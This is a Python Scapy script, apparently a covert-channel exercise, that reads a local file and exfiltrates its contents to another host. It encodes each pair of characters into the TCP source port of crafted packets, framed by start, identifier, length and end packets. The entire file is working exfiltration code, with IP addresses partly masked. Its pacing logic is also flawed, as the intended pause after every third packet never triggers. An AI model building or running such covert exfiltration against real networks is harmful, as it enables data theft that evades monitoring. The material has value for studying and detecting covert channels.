 #! /usr/bin/env python3
 #Author: Giacomo Nunno

from scapy.all import *
import codecs
import sys
import time
import random

def file_to_decimal(filename):
    fname = filename
    #open file
    try:
        file = open(fname)
    except OSError:
        print("Could not open/read file: {}".format(fname))
        sys.exit()

    with file:
        content = file.read()
        file.close()
        #save file contents as binary
        binary_of_file_content = ' '.join(format(ord(x), 'b') for x in content)

    #splitting it to a list
    list_of_binary = binary_of_file_content.split()

    #add leading 0s to the binary
    i = 0
    while i < len(list_of_binary): 
        while len(list_of_binary[i]) < 8:
            list_of_binary[i] = "0" + list_of_binary[i]
        i += 1 
    #print("List of binary: \n {}".format(list_of_binary))

    #combine 2 characters per packet and 
    #convert the binary to decimal
    finished_decimal_list = []
    j = 0
    while j < len(list_of_binary): 
        if (j % 2) == 0:
            if j+1 < len(list_of_binary):
                #if the number of characters is even
                temp = int(list_of_binary[j] + list_of_binary[j+1], 2)
            else:
                #if the number of characters is odd
                temp = int(list_of_binary[j] + "00000000", 2)
            finished_decimal_list.append(temp)
        j += 1 
    
    #print("List of decimal: \n {}".format(finished_decimal_list))  
    return finished_decimal_list

def send_packet(source_IP, dst_IP, src_port, dst_port=5433):
    packet = IP()/TCP(dport=dst_port, sport=src_port)
    packet.src = source_IP
    packet.dst = dst_IP
    print(packet.summary())
    send(packet)

def main():
    #creates the list of source ports to send
    sourceIP = "192.168.xx.xxx"
    destinationIP = "192.168.xx.xxx"
    file_to_be_exfiltrated = "dataToBeExfiltrated.txt"
    list_of_decimal = file_to_decimal(file_to_be_exfiltrated)

    #seconds between 3 packets
    packet_timeout = 1

    #initial packet sent with port 32768 to signal the start of the data transfer
    send_packet(sourceIP, destinationIP, 32768)

    #second packet with the unique identifier for this machine as the source port
    #currently we generate random port number between 32768 and 65535 as a unique ID
    unique_ID = random.randint(32769 , 65534)
    send_packet(sourceIP, destinationIP, unique_ID)

    #third packet sent with port set to the amount of packets being sent
    length_of_decimal = int(len(list_of_decimal))
    send_packet(sourceIP, destinationIP, length_of_decimal)
    
    #loop through and send packets, pause every 3rd packet
    packet_counter = 3
    for i in list_of_decimal:
        #create and send the packets one by one
        send_packet(sourceIP, destinationIP, int(i))
        packet_counter += 1
        if packet_counter == 3:
            time.sleep(packet_timeout)
            packet_counter = 0

    #Last packet sent with port 32768 to signal the end of the data transfer
    send_packet(sourceIP, destinationIP, 32768)

    print("All packets have been sent.")


if __name__ == "__main__":
    main()
